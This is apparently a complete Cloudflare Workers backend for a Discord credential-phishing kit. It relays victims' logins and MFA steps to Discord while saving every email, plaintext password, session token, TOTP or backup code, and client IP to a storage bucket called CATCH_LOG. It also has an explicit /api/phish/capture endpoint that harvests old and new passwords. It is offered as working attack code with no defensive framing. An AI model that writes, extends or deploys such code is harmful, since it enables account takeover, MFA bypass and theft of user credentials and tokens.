// language: JavaScript (ESM), file: src/index.js, target: Cloudflare Workers + Hono

import { Hono } from "hono";
import { cors } from "hono/cors";
import { login, mfaTotp, mfaBackup, getUserInfo } from "../discord.js";

const app = new Hono();

app.use("*", cors());
app.use("*", async (c, next) => {
  c.header("X-Content-Type-Options", "nosniff");
  c.header("X-Frame-Options", "DENY");
  await next();
});

async function logCapture(env, type, data) {
  const entry = {
    ts: new Date().toISOString(),
    type,
    payload: data,
  };
  const key = `log:${Date.now()}:${crypto.randomUUID()}`;
  await env.CATCH_LOG.put(key, JSON.stringify(entry));
  console.log(`[CATCH] ${type} | ${JSON.stringify(data).slice(0, 80)}`);
}

app.post("/api/login", async (c) => {
  const { email, password } = await c.req.json();
  if (!email || !password)
    return c.json({ success: false, error: "Missing fields" });

  const ip = c.req.header("CF-Connecting-IP") ?? "unknown";
  await logCapture(c.env, "login_attempt", { ip, email, password });

  const result = await login(email, password, c.env);

  if (result.success && result.token) {
    await logCapture(c.env, "token_captured", { ip, email, token: result.token });
  }

  return c.json(result);
});

app.post("/api/mfa/totp", async (c) => {
  const { ticket, code } = await c.req.json();
  if (!ticket || !code) return c.json({ success: false, error: "Missing" });
  const ip = c.req.header("CF-Connecting-IP") ?? "unknown";
  const result = await mfaTotp(ticket, code);
  if (result.success)
    await logCapture(c.env, "mfa_token", { ip, code, token: result.token });
  return c.json(result);
});

app.post("/api/mfa/backup", async (c) => {
  const { ticket, code } = await c.req.json();
  if (!ticket || !code) return c.json({ success: false, error: "Missing" });
  const ip = c.req.header("CF-Connecting-IP") ?? "unknown";
  const result = await mfaBackup(ticket, code);
  if (result.success)
    await logCapture(c.env, "backup_token", { ip, code, token: result.token });
  return c.json(result);
});

app.post("/api/userinfo", async (c) => {
  const { token } = await c.req.json();
  if (!token) return c.json({ success: false, error: "No token" });
  const result = await getUserInfo(token);
  return c.json(result);
});

app.post("/api/phish/capture", async (c) => {
  const { email, password, new_password } = await c.req.json();
  const ip = c.req.header("CF-Connecting-IP") ?? "unknown";
  await logCapture(c.env, "phish_reset", { ip, email, password, new_password });
  return c.json({ success: true });
});

export default app;
